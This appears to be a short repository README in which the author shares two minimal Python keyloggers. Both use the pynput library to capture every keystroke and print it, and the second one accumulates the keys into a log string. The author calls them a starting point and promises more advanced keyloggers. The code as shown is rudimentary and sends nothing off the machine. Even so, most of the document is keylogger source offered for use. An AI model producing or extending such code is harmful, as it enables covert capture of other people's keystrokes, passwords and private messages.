# keylogger

it is an mini keylogger which prints all key strokes typed in our terminal(iam using in kali)

iam attaching the python file and code here;)



<code starts here>


import pynput.keyboard


def callback_function(key):
    print(key)

keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)
with keylogger_listener:
    keylogger_listener.join()
    
    
    <code ends here>
    
    
    
    
    
    
    this code is little bit different compared to 1st one kindly use and explore yourself
(ill upload new keyloggers which has different features and advancements hope it will be usefull:) 


<code starts here>


import pynput.keyboard

log = ""

def callback_function(key):
    global log
    log = log + str(key)
    print(log)
keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)
with keylogger_listener:
    keylogger_listener.join()
    
    
    <code ends here>
